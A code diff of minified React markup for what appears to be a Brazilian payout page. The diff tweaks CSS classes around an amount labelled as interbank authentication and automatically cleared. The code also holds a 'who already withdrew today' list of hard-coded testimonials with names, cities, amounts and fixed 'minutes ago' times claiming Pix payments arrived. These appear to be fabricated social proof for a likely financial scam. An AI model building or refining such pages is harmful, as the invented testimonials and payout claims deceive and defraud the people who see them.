@@ -183,12 +183,12 @@ const xe = () => {
                 className: "text-muted-foreground text-[12px] uppercase tracking-wide font-bold mb-3",
                 children: "Autenticação interbancária"
             }), e.jsxs("div", {
-                className: "flex items-center gap-3 mb-3",
+                className: "flex items-center justify-between gap-2 mb-3",
                 children: [e.jsx("span", {
-                    className: "text-[#10B981] text-[28px] font-extrabold",
+                    className: "text-[#10B981] text-[24px] font-extrabold whitespace-nowrap",
                     children: n(p)
                 }), e.jsx("span", {
-                    className: "text-[#10B981] text-[10px] font-bold border border-[#10B981] rounded-full px-2.5 py-0.5 animate-pulse",
+                    className: "text-[#10B981] text-[9.5px] font-bold border border-[#10B981] rounded-full px-2 py-0.5 animate-pulse whitespace-nowrap",
                     children: "Valor compensado automaticamente"
                 })]
             }), e.jsxs("p", {
@@ -370,7 +370,7 @@ const xe = () => {
                 children: "Quem já sacou hoje"
             }), [{
                 img: K, name: "Lucas M.", city: "São Paulo", value: "R$ 2.800", time: "há 12 min", text: "mano eu nem tava acreditando muito mas entrou certinho na minha conta, apareceu o pix na hora"
-            }, {
+            }, {         
                 img: U, name: "Amanda S.", city: "Rio de Janeiro", value: "R$ 1.450", time: "há 28 min", text: "fiz pelo nubank aqui e confirmou normal, achei q ia demorar mais caiu rapido"
             }, {
                 img: Q, name: "Rafael O.", city: "Belo Horizonte", value: "R$ 3.200", time: "há 43 min", text: "eu achei q era so mais um app aleatorio mas realmente entrou o dinheiro"
